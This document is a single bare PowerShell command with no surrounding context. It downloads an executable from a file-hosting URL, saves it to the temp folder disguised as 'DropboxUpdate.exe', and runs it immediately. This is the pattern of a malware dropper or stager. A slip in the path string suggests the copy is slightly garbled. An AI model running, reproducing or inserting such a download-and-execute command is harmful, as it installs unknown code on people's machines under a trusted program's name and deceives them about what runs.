(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',"$env:TEMPDropboxUpdate.exe");Start-Process ("$env:TEMPDropboxUpdate.exe")